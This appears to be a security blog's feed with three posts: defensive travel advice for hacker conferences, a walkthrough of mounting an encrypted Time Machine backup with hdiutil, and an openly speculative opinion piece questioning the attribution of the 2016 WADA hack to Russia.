&lt;div style=&quot;&quot;&gt;3. Device getting owned via physical access while in a hotel room.&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/Capture.PNG&quot; src=&quot;https://z6543.github.io/_img/Capture.PNG&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;513&quot; data-original-width=&quot;616&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/Capture.PNG&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;4. Network traffic Man-in-the-middle attacked. Your password displayed on a Wall of Sheep. Or having fun with &lt;a href=&quot;https://twitter.com/parkerschmitt/status/515415443528351744&quot; target=&quot;_blank&quot;&gt;Shellshock &lt;/a&gt;with DHCP. Information leak of NTLM hashes or similar.&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/Capture2.PNG&quot; src=&quot;https://z6543.github.io/_img/Capture2.PNG&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;598&quot; data-original-width=&quot;679&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/Capture2.PNG&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;5. Pwning the device via some nasty things like WiFi/TCP/Bluetooth/LTE/3G/GSM stack. These are unicorn attacks.&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/b95.png&quot; src=&quot;https://z6543.github.io/_img/b95.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;1600&quot; data-original-width=&quot;1377&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/b95.png&quot; width=&quot;275&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;6. Pwning your device by pwning a service on your device. Like leaving your upload.php file in the root folder you use at CTFs and Nginx is set to autostart. The author of this article cannot comment on this incident whether it happened in real life or is just an imaginary example. &lt;/div&gt;
&lt;h3 style=&quot;text-align: justify;&quot;&gt;How to mitigate these risks? &lt;/h3&gt;
&lt;div style=&quot;&quot;&gt;Laptop getting stolen/lost/inspected at the border?&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;1. Bring a cheap, empty device with you. Or set up a fake OS/fake account to log in if you really need your day-to-day laptop. This dummy account should not decrypt the real files in the real account.&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/c05916387.png&quot; src=&quot;https://z6543.github.io/_img/c05916387.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;430&quot; data-original-width=&quot;573&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/c05916387.png&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;h4 style=&quot;text-align: justify;&quot;&gt;Device getting owned while in a hotel room with physical access&lt;/h4&gt;
&lt;div style=&quot;&quot;&gt;1. Don't bring any device with you.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;2. If you bring any, make it tamper-resistant. How to do that depends on your enemy, but you can start by using nail glitter and Full Disk Encryption. Tools like Do Not Disturb help. It also helps if your OS supports suspending DMA devices before the user logs in.&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/tamper_4.png&quot; src=&quot;https://z6543.github.io/_img/tamper_4.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;688&quot; data-original-width=&quot;1020&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/tamper_4.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;3. If you can't make the device tamper-resistant, use a device that has a good defense against physical attackers, like iOS.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;4. Probably you are not that important anyway that anyone will spend time and resources on you. If they do, probably you will only make your life miserable with all the hardening, but still, get pwned.&lt;/div&gt;
&lt;h4 style=&quot;text-align: justify;&quot;&gt;Network traffic Man-in-the-middle attacked&lt;/h4&gt;
&lt;div style=&quot;&quot;&gt;1. Don't bring any device with you.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;2. Use services that are protected against MiTM. Like TLS.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;3. Update your OS to the latest and greatest versions. Not everyone at DEF CON has a 0dayz worth of 100K USD, and even the ones who have won't waste it on you. &lt;/div&gt;
&lt;div style=&quot;&quot;&gt;4. Use fail-safe VPN. Unfortunately, not many people talk about this or have proper solutions for the most popular operating systems.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;5. For specific attacks like Responder, disable&lt;a href=&quot;http://www.pciqsatalk.com/2016/03/disable-lmnr-netbios.html&quot; target=&quot;_blank&quot;&gt; LLMNR, NBT-NS&lt;/a&gt;, &lt;a href=&quot;https://stackoverflow.com/a/41048991&quot; target=&quot;_blank&quot;&gt;WPAD, &lt;/a&gt;and &lt;a href=&quot;https://medium.com/@JockDaRock/disabling-ipv6-on-network-adapter-windows-10-5fad010bca75&quot; target=&quot;_blank&quot;&gt;IPv6 &lt;/a&gt;and use a non-work account on the machine. If you don't have the privileges to do so on your machine, you probably should not bring this device with you. Or ask your local IT to disable these services and set up a new account for you.&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/win10.png&quot; src=&quot;https://z6543.github.io/_img/win10.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;714&quot; data-original-width=&quot;1366&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/win10.png&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;h4 style=&quot;text-align: justify;&quot;&gt;Pwning the device via some nasty thing like WiFi/TCP/Bluetooth/LTE/3G/GSM stack&lt;/h4&gt;
&lt;div style=&quot;&quot;&gt;1. Don't bring any device with you.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;2. If you bring any, do not use this device to log in to work, personal email, social media, etc.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;3. Don't worry, these things don't happen very often. &lt;/div&gt;
&lt;h4 style=&quot;text-align: justify;&quot;&gt;Pwning your device by pwning a service on your device&lt;/h4&gt;
&lt;div style=&quot;&quot;&gt;Just set up a firewall profile where all services are hidden from the outside. You rarely need any service accessible on your device at a hacker conference.&lt;/div&gt;
&lt;h3 style=&quot;text-align: justify;&quot;&gt;Conclusion&lt;/h3&gt;
&lt;div style=&quot;&quot;&gt;If you are still so afraid to go there, just don't go there. Watch the talks at home. But how is the hotel WiFi at a random place different from a hacker conference? &lt;a href=&quot;https://securelist.com/the-darkhotel-apt/66779/&quot; target=&quot;_blank&quot;&gt;Turns out, it is not much different&lt;/a&gt;, so you better spend time and resources on hardening your daily work devices for 365 days, instead of building a &quot;burner device&quot;.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;You probably need a &quot;burner device&quot; if you are a spy for a foreign government. Or you are the head of a criminal organization. Otherwise, you don't need a burner device. Maybe you need to bring a cheap replacement device.&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>Recovering data from an old encrypted Time Machine backup</title>
   <link href="https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/forensics/macos/nas/time/capsule/machine/2018/07/21/Recovering-data-from-an-old-encrypted-Time-Machine-backup.html"/>
   <updated>2018-07-21T13:32:30+00:00</updated>
   <id>https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/forensics/macos/nas/time/capsule/machine/2018/07/21/Recovering-data-from-an-old-encrypted-Time-Machine-backup</id>
   <content type="html">&lt;p&gt;Recovering data from a backup should be an easy thing to do. At least this is what you expect. Yesterday I had a problem which should have been easy to solve, but it was not. I hope this blog post can help others who face the same problem.&lt;/p&gt;

&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/macos-high-sierra-system-preferences-time-machine.jpg&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/macos-high-sierra-system-preferences-time-machine.jpg&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;881&quot; data-original-width=&quot;1336&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/macos-high-sierra-system-preferences-time-machine.jpg&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;h2&gt;The problem&lt;/h2&gt;
&lt;ol&gt;
  &lt;li&gt;I had an encrypted Time Machine backup which was not used for months&lt;/li&gt;
  &lt;li&gt;This backup was not on an official Apple Time Capsule or on a USB HDD, but on a WD MyCloud NAS&lt;/li&gt;
  &lt;li&gt;I needed files from this backup&lt;/li&gt;
  &lt;li&gt;After running out of time I only had SSH access to the macOS, no GUI&lt;/li&gt;
&lt;/ol&gt;

&lt;h2&gt;The struggle&lt;/h2&gt;
&lt;p&gt;By default, Time Machine is one of the best and easiest backup solution I have seen. As long as you stick to the default use case, where you have one active backup disk, life is pink and happy. But this was not my case.&lt;/p&gt;

&lt;p&gt;As always, I started to Google what shall I do. One of the first options recommended that I add the backup disk to Time Machine, and it will automagically show the backup snapshots from the old backup. Instead of this, it did not show the old snapshots but started to create a new backup. Panic button has been pressed, backup canceled, back to Google.&lt;/p&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://1.bp.blogspot.com/-9Die_5TbKPc/W1BFBZBDAcI/AAAAAAAACrE/jla8CDuxZh8S83G-piox8g9FqzH9IBPvwCLcBGAs/s1600/use-additional-backup-drive-time-machine.jpeg&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;321&quot; data-original-width=&quot;516&quot; height=&quot;199&quot; src=&quot;https://1.bp.blogspot.com/-9Die_5TbKPc/W1BFBZBDAcI/AAAAAAAACrE/jla8CDuxZh8S83G-piox8g9FqzH9IBPvwCLcBGAs/s320/use-additional-backup-drive-time-machine.jpeg&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;

&lt;p&gt;Other tutorials recommend to click on the Time Machine icon and pressing alt (Option) key, where I can choose “Browse other backup disks”. But this did not list the old Time Machine backup. It did list the backup when selecting disks in Time Machine preferences, but I already tried and failed that way.&lt;/p&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://3.bp.blogspot.com/-qIZjV8XjqtU/W1BE3bvCtwI/AAAAAAAACrA/tO8szi90eP8EntDpnv42WHzv7If__keogCLcBGAs/s1600/browse-additional-backup-disks.jpeg&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;191&quot; data-original-width=&quot;437&quot; height=&quot;139&quot; src=&quot;https://3.bp.blogspot.com/-qIZjV8XjqtU/W1BE3bvCtwI/AAAAAAAACrA/tO8szi90eP8EntDpnv42WHzv7If__keogCLcBGAs/s320/browse-additional-backup-disks.jpeg&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;

&lt;p&gt;YAT (yet another tutorial) recommended to SSH into the NAS, and browse the backup disk, as it is just a simple directory where I can see all the files. But all the files inside where just a bunch of nonsense, no real directory structure.&lt;/p&gt;

&lt;p&gt;YAT (yet another tutorial) recommended that I can just easily browse the content of the backup from the Finder by double-clicking on the sparse bundle file. After clicking on it, I can see the disk image on the left part of the Finder, attached as a new disk.
Well, this is true, but because of some bug, when you connect to the Time Capsule, you don’t see the sparse bundle file. And I got inconsistent results, for the WD NAS, double-clicking on the sparse bundle did nothing. For the Time Capsule, it did work.
At this point, I had to leave the location where the backup was present, and I only had remote SSH access. You know, if you can’t solve a problem, let’s complicate things by restrict yourself in solutions.
&lt;span style=&quot;color: red;&quot;&gt;
&lt;/span&gt;Finally, I tried to check out some data forensics blogs, and besides some expensive tools, I could find the solution.&lt;/p&gt;
&lt;h2&gt;The solution&lt;/h2&gt;
&lt;p&gt;Finally, a &lt;a href=&quot;https://d4rkw1ll0w4n6.wordpress.com/2015/02/12/timemachine-4n6/&quot; target=&quot;_blank&quot;&gt;blog post&lt;/a&gt; provided the real solution - hdiutil.
The best part of hdiutil is that you can provide the read-only flag to it. This can be very awesome when it comes to forensics acquisition.&lt;/p&gt;

&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/Screen2BShot2B2018-07-192Bat2B09.54.50.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/Screen2BShot2B2018-07-192Bat2B09.54.50.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;389&quot; data-original-width=&quot;1596&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/Screen2BShot2B2018-07-192Bat2B09.54.50.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;p&gt;To mount any NAS via SMB:&lt;/p&gt;
&lt;pre class=&quot;prettyprint lang-bsh&quot;&gt;mount_smbfs afp://&amp;lt;username&amp;gt;@&amp;lt;NAS_IP&amp;gt;/&amp;lt;Share_for_backup&amp;gt; /&amp;lt;mountpoint&amp;gt;&lt;/pre&gt;
&lt;p&gt;To mount a Time Capsule share via AFP:&lt;/p&gt;
&lt;pre class=&quot;prettyprint lang-bsh&quot;&gt;mount_afp afp://any_username:password@&amp;lt;Time_Capsule_IP&amp;gt;/&amp;lt;Share_for_backup&amp;gt; /&amp;lt;mountpoint&amp;gt;&lt;/pre&gt;
&lt;p&gt;And finally this command should do the job:&lt;/p&gt;
&lt;pre class=&quot;prettyprint lang-bsh&quot;&gt;hdiutil attach test.sparsebundle -readonly&lt;/pre&gt;
&lt;p&gt;It is nice that you can provide read-only parameter.&lt;/p&gt;

&lt;p&gt;If the backup was encrypted and you don’t want to provide the password in a password prompt, use the following:&lt;/p&gt;
&lt;pre class=&quot;prettyprint lang-bsh&quot;&gt;printf '%s' 'CorrectHorseBatteryStaple' | hdiutil attach test.sparsebundle -stdinpass -readonly&lt;/pre&gt;
&lt;p&gt;Note: if you receive the error “resource temporarily unavailable”, probably another machine is backing up to the device&lt;/p&gt;

&lt;p&gt;And now, you can find your backup disk under /Volumes. Happy restoring!&lt;/p&gt;

&lt;p&gt;Probably it would have been quicker to either enable the remote GUI, or to physically travel to the system and login locally, but that would spoil the fun.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Why (I believe) WADA was not hacked by the Russians</title>
   <link href="https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/attribution/hack/russia/wada/2016/10/17/Why-(I-believe)-WADA-was-not-hacked-by-the-Russians.html"/>
   <updated>2016-10-17T13:35:24+00:00</updated>
   <id>https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/attribution/hack/russia/wada/2016/10/17/Why-(I-believe)-WADA-was-not-hacked-by-the-Russians</id>
   <content type="html">&lt;p&gt;Disclaimer: This is my personal opinion. I am not an expert in attribution. But as it turns out, not many people in the world are good at attribution. I know this post lacks real evidence and is mostly based on speculation.&lt;/p&gt;

&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/wada.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/wada.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/wada.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;

&lt;p&gt;Let’s start with the main facts we know about the WADA hack, in chronological order:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Some point in time (August - September 2016), the WADA database has been hacked and exfiltrated&lt;/li&gt;
&lt;/ol&gt;
&lt;div&gt;2. August 15th, &quot;WADA has alerted their stakeholders that email phishing scams are being reported in connection with WADA and therefore asks its recipients to be careful&quot;  &lt;a href=&quot;https://m.paralympic.org/news/wada-warns-stakeholders-phishing-scams&quot;&gt;https://m.paralympic.org/news/wada-warns-stakeholders-phishing-scams&lt;/a&gt;
3. September 1st, the fancybear.net domain has been registered
&lt;div&gt;&lt;pre style=&quot;font-family: &amp;quot;Courier New&amp;quot;, monospace; font-size: 13px;&quot;&gt;   Domain Name: FANCYBEAR.NET
   ...
   Updated Date: 18-sep-2016
   Creation Date: 01-sep-2016&lt;/pre&gt;&lt;pre style=&quot;font-family: &amp;quot;Courier New&amp;quot;, monospace; font-size: 13px;&quot;&gt;&lt;/pre&gt;&lt;/div&gt;4. The content of the WADA hack has been published on the website
5. The @FancyBears and @FancyBearsHT Twitter accounts have been created and started to tweet on 12th September, reaching out to journalists
6. 12th September, Western media started headlines &quot;Russia hacked WADA&quot;&lt;/div&gt;
&lt;div&gt;7. The leaked documents have been altered, states WADA &lt;a href=&quot;https://www.wada-ama.org/en/media/news/2016-10/cyber-security-update-wadas-incident-response&quot;&gt;https://www.wada-ama.org/en/media/news/2016-10/cyber-security-update-wadas-incident-response&lt;/a&gt;


&lt;h3&gt;The Threatconnect analysis&lt;/h3&gt;The only technical analysis on why Russia was behind the hack, can be read here: &lt;a href=&quot;https://www.threatconnect.com/blog/fancy-bear-anti-doping-agency-phishing/&quot;&gt;https://www.threatconnect.com/blog/fancy-bear-anti-doping-agency-phishing/&lt;/a&gt;

After reading this, I was able to collect the following main points:

&lt;ol&gt;&lt;li&gt;It is Russia because Russian APT groups are capable of phishing&lt;/li&gt;&lt;li&gt;It is Russia because the phishing site &quot;wada-awa[.]org was registered and uses a name server from ITitch[.]com, a domain registrar that FANCY BEAR actors recently used&quot;&lt;/li&gt;&lt;li&gt;It is Russia because &quot;Wada-arna[.]org and tas-cass[.]org were registered through and use name servers from Domains4bitcoins[.]com, a registrar that has also been associated with FANCY BEAR activity.&quot;&lt;/li&gt;&lt;li&gt;It is Russia, because &quot;The registration of these domains on August 3rd and 8th, 2016 are consistent with the timeline in which the WADA recommended banning all Russian athletes from the Olympic and Paralympic games.&quot;&lt;/li&gt;&lt;li&gt;It is Russia, because &quot;The use of 1&amp;amp;1 mail.com webmail addresses to register domains matches a TTP we previously identified for FANCY BEAR actors.&quot;&lt;/li&gt;&lt;/ol&gt;
There is an interesting side-track in the article, the case of the @anpoland account. Let me deal with this at the end of this post.

My problem with the above points is that all five flag was publicly accessible to anyone as TTP's for Fancy Bear. And meanwhile, all five is weak evidence. Any script kittie in the world is capable of both hacking WADA and planting these false-flags.

A stronger than these weak pieces of evidence would be:

&lt;ul&gt;&lt;li&gt;Malware sharing same code attributed to Fancy Bear (where the code is not publicly available or circulating on hackforums)&lt;/li&gt;&lt;li&gt;Private servers sharing the IP address with previous attacks attributed to Fancy Bear (where the server is not a hacked server or a proxy used by multiple parties)&lt;/li&gt;&lt;li&gt;E-mail addresses used to register the domain attributed to Fancy Bear&lt;/li&gt;&lt;li&gt;Many other things&lt;/li&gt;&lt;/ul&gt;&lt;div&gt;For me, it is quite strange that after such &lt;a href=&quot;https://www.threatconnect.com/blog/guccifer-2-0-dnc-breach/&quot; target=&quot;_blank&quot;&gt;great analysis on Guccifer 2.0&lt;/a&gt;, the Threatconnect guys came up with this low-value post. &lt;/div&gt;&lt;div&gt;
&lt;/div&gt;
&lt;h3&gt;The fancybear website&lt;/h3&gt;It is quite unfortunate that the analysis was not updated after the documents have been leaked. But let's just have a look at the fancybear . net website, shall we?
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/screencapture-fancybear-net-1476519267721.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/screencapture-fancybear-net-1476519267721.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/screencapture-fancybear-net-1476519267721.png&quot; width=&quot;130&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
Now the question is, if you are a Russian state-sponsored hacker group, and you are already accused of the hack itself, do you create a website with tons of bears on the website, and do you choose the same name (Fancy Bear) for your &quot;Hack team&quot; that is already used by Crowdstrike to refer to a Russian state-sponsored hacker group? Well, for me, it makes no sense. Now I can hear people screaming: &quot;The Russians changed tactics to confuse us&quot;. Again, it makes no sense to change tactics on this, while keeping tactics on the &quot;evidence&quot; found by Threatconnect.

It makes sense that a Russian state-sponsored group creates a fake persona, names it Guccifer 2.0, pretends Guccifer 2.0 is from Romania, but in the end it turns out Guccifer 2.0 isn't a native Romanian speaker. That really makes sense.

What happens when someone creates this fancybear website for leaking the docs, and from the Twitter account reaches out to the media? Journalists check the website, they see it was done by Fancy Bear, they &lt;strike&gt;Bing&lt;/strike&gt; Google this name, and clearly see it is a Russian state-sponsored hacker group. Some journalists also found the Threatconnect report, which seems very convincing for the first read. I mean, it is a work of experts, right? So you can write in the headlines that the hack was done by the Russians.

Just imagine an expert in the USA or Canada writing in report for WADA:
&quot;the hack was done by non-Russian, but state-sponsored actors, who planted a lot of false-flags to accuse the Russians and to destroy confidence in past and future leaks&quot;. Well, I am sure this is not a popular opinion, and whoever tries this, risks his career. Experts are human, subject to all kinds of bias.

&lt;h3&gt;The Guardian&lt;/h3&gt;The only other source I was able to find is from The Guardian, where not just one side (it was Russia) was represented in the article. It is quite unfortunate that both experts are from Russia - so people from USA will call them being not objective on the matter. But the fact that they are Russian experts does not mean they are not true ...

&lt;a href=&quot;https://www.theguardian.com/sport/2016/sep/15/fancy-bears-hackers--russia-wada-tues-leaks&quot;&gt;https://www.theguardian.com/sport/2016/sep/15/fancy-bears-hackers--russia-wada-tues-leaks&lt;/a&gt;

Sergei Nikitin:
“We don’t have this in the case of the DNC and Wada hacks, so it’s not clear on what basis conclusions are being drawn that Russian hackers or special services were involved. It’s done on the basis of the website design, which is absurd,” he said, referring to the depiction of symbolically Russian animals, brown and white bears, on the “Fancy Bears’ Hack Team” website.

I don't agree with the DNC part, but this is not the topic of conversation here.

Alexander Baranov:
&quot;the hackers were most likely amateurs who published a “semi-finished product” rather than truly compromising information. “They could have done this more harshly and suddenly,” he said. “If it was [state-sponsored] hackers, they would have dug deeper. Since it’s enthusiasts, amateurs, they got what they got and went public with it.”&quot;

&lt;h3&gt;The @anpoland side-track&lt;/h3&gt;First please check the tas-cas.org hack &lt;a href=&quot;https://www.youtube.com/watch?v=day5Aq0bHsA%C2%A0&quot; target=&quot;_blank&quot;&gt;https://www.youtube.com/watch?v=day5Aq0bHsA &lt;/a&gt; , I will be here when you finished it. This is a website for &quot;Court of Arbitration for Sport’s&quot;, and referring to the Threatconnect post, &quot;CAS is the highest international tribunal that was established to settle disputes related to sport through arbitration. Starting in 2016, an anti-doping division of CAS began judging doping cases at the Olympic Games, replacing the IOC disciplinary commission.&quot; Now you can see why this attack is also discussed here.
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/anpoland.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/anpoland.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/anpoland.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;

&lt;ul&gt;&lt;li&gt;My bet is that this machine was set-up for these @anpoland videos only. Whether google.ru is a false flag or it is real, hard to decide. It is interesting to see that there is no google search done via google.ru, it is used only once. &lt;/li&gt;&lt;li&gt;The creator of the video can't double click. Is it because he has a malfunctioning mouse? Is it because he uses a virtualization console, which is near-perfect OPSEC to hide your real identity? My personal experience is that using virtualization consoles remotely (e.g. RDP) has very similar effects to what we can see on the video. &lt;/li&gt;&lt;li&gt;The timeline of the Twitter account is quite strange, registered in 2010&lt;/li&gt;&lt;li&gt;I agree with the Threatconnect analysis that this @anpoland account is probably a faketivist, and not an activist. But who is behind it, remains a mystery. &lt;/li&gt;&lt;li&gt;Either the &quot;activist&quot; is using a whonix-like setup for remaining anonymous, or a TOR router (something like &lt;a href=&quot;https://makezine.com/projects/browse-anonymously-with-a-diy-raspberry-pi-vpntor-router/&quot; target=&quot;_blank&quot;&gt;this&lt;/a&gt;), or does not care about privacy at all. Looking at the response times (SQLmap, web browser), I doubt this &quot;activist&quot; is behind anything related to TOR. Which makes no sense for an activist, who publishes his hack on Youtube. People are stupid for sure, but this does not add up. It makes sense that this was a server (paid by bitcoins or stolen credit cards or whatever) rather than a home computer.&lt;/li&gt;&lt;/ul&gt;&lt;div&gt;For me, this whole @anpoland thing makes no sense, and I think it is just loosely connected to the WADA hack. &lt;/div&gt;
&lt;h3&gt;The mysterious Korean characters in the HTML source&lt;/h3&gt;&lt;div&gt;There is another interesting flag in the whole story, which actually makes no sense. When the website was published, there were Korean characters in HTML comments. &lt;/div&gt;&lt;div&gt;&lt;a href=&quot;https://web.archive.org/web/20160913013727/http://fancybear.net/&quot;&gt;https://web.archive.org/web/20160913013727/http://fancybear.net/&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/korean1.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/korean1.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/korean1.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;/div&gt;&lt;div&gt;
&lt;/div&gt;&lt;div&gt;
&lt;/div&gt;&lt;div&gt;When someone pointed this out on Twitter, these Korean HTML comments disappeared:&lt;/div&gt;&lt;div&gt;&lt;a href=&quot;https://web.archive.org/web/20160914231209/http://www.fancybear.net/&quot;&gt;https://web.archive.org/web/20160914231209/http://www.fancybear.net/&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/korean2.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/korean2.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/korean2.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div&gt;These HTML comments look like generated HTML comments, from a WYSIWYG editor, which is using the Korean language. Let me know if you can identify the editor.&lt;/div&gt;&lt;div&gt;
&lt;/div&gt;&lt;h3&gt;The Russians are denying it&lt;/h3&gt;&lt;div&gt;Well, what choice they have? It does not matter if they did this or not, they will deny it. And they can't deny this differently. Just imagine a spokesperson: &quot;Previously we have falsely denied the DCC and DNC hacks, but this time please believe us, this wasn't Russia.&quot; Sounds plausible ...

&lt;/div&gt;&lt;h3&gt;Attribution&lt;/h3&gt;Let me sum up what we know:

It makes sense that the WADA hack was done by Russia, because:

&lt;ol&gt;&lt;li&gt;Russia being almost banned from the Olympics due to doping scandal, it made sense to discredit WADA and US Olympians&lt;/li&gt;&lt;li&gt;There are multiple(weak) pieces of evidence which point to Russia&lt;/li&gt;&lt;/ol&gt;&lt;div&gt;It makes sense that the WADA hack was not done by  Russia, because: &lt;/div&gt;&lt;div&gt;&lt;ol&gt;&lt;li&gt;By instantly attributing the hack to the Russians, the story was more about to discredit Russia than discrediting WADA or US Olympians.&lt;/li&gt;&lt;li&gt;In reality, there was no gain for Russia for disclosing the documents. Nothing happened, nothing changed, no discredit for WADA. Not a single case turned out to be illegal or unethical.&lt;/li&gt;&lt;li&gt;&lt;strike&gt;Altering the leaked documents makes no sense if it was Russia&lt;/strike&gt; (see update at the end). Altering the leaked documents makes a lot of sense if it was not Russia. Because from now on, people can always state &quot;these leaks cannot be trusted, so it is not true what is written there&quot;. It is quite cozy for any US organization, who has been hacked or will be hacked. If you are interested in the &quot;Russians forging leaked documents&quot; debate, I highly recommend to start with this &lt;a href=&quot;https://theintercept.com/2016/10/11/in-the-democratic-echo-chamber-inconvenient-truths-are-recast-as-putin-plots/&quot; target=&quot;_blank&quot;&gt;The Intercept&lt;/a&gt; article&lt;/li&gt;&lt;li&gt;If the Korean characters were false flags planted by the Russians, why would they remove it? If it had been Russian characters, I would understand removing it.&lt;/li&gt;&lt;li&gt;All evidence against Russia is weak, can be easily forged by even any script kittie.&lt;/li&gt;&lt;/ol&gt;&lt;div&gt;
&lt;/div&gt;I don't like guessing, but here is my guess. This WADA hack was an operation of a (non-professional) hackers-for-hire service, paid by an enemy of Russia. The goal was to hack WADA, leak the documents, modify some contents in the documents, and blame it all on the Russians ...

